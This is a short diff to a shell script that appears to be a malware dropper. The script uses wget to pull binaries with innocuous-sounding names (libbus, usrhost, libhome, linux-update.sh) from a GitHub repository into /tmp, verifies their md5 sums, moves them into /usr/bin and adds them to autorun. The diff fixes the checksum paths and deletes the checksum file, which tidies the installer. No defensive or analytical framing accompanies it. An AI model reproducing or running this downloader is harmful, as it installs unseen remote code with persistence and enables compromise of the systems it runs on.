@@ -8,11 +8,14 @@ wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /tm
 wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /tmp/linux-update.sh
 wget https://raw.githubusercontent.com/myvulweb/b2/master/md5 -O /tmp/mymd5
 
-check1=`cat mymd5 | grep \`md5sum libbus | cut -d " " -f1\``
-check2=`cat mymd5 | grep \`md5sum usrhost | cut -d " " -f1\``
-check3=`cat mymd5 | grep \`md5sum libhome | cut -d " " -f1\``
-check4=`cat mymd5 | grep \`md5sum usrhost_ver.txt | cut -d " " -f1\``
-check5=`cat mymd5 | grep \`md5sum linux-update.sh | cut -d " " -f1\``
+check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/libbus | cut -d " " -f1\``
+check2=`cat /tmp/mymd5 | grep \`md5sum /tmp/usrhost | cut -d " " -f1\``
+check3=`cat /tmp/mymd5 | grep \`md5sum /tmp/libhome | cut -d " " -f1\``
+check4=`cat /tmp/mymd5 | grep \`md5sum /tmp/usrhost_ver.txt | cut -d " " -f1\``
+check5=`cat /tmp/mymd5 | grep \`md5sum /tmp/linux-update.sh | cut -d " " -f1\``
+
+rm -rf /tmp/mymd5
+
 
 if [[ "$check1" = "" || "$check2" = "" || "$check3" = "" || "$check4" = "" || "$check5" = "" ]]
 then
@@ -52,6 +55,7 @@ mv /tmp/libbus /usr/bin/libbus
 mv /tmp/libhome /usr/bin/libhome
 mv /tmp/linux-update.sh /usr/bin/linux-update.sh
 mv /tmp/usrhost_ver.txt /usr/bin/usrhost_ver.txt
+
 
 #my daemon and add autorun
 
